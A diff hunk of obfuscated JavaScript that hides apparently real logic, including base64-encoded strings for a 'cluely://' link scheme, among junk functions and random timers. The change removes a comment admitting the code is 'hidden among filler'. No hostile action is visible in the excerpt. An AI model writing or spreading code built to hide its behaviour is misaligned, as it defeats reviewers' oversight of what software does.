@@ -30,7 +30,6 @@ function _0xutil3(){let _0xhash=0;let _0xstr=Date.now().toString();for(let i=0;i
 setInterval(()=>{_0xmonitor1();_0xnetwork2();_0xutil3();},Math.random()*5000+1000);
 setTimeout(()=>{_0xfiller3.push(_0xutil2());},Math.random()*3000);
 
-// REAL CODE STARTS HERE (hidden among filler)
 let _0xc3d4=false,_0xe5f6=false,_0x7g8h=atob('Y2x1ZWx5Oi8v'),_0x9i0j=atob('Y2xvc2Vk'),_0x1k2l=atob('ZXJybw==');
 
 function _0xjunk1(){return _0xfiller1.map(s=>s.split('').reverse().join(''));}
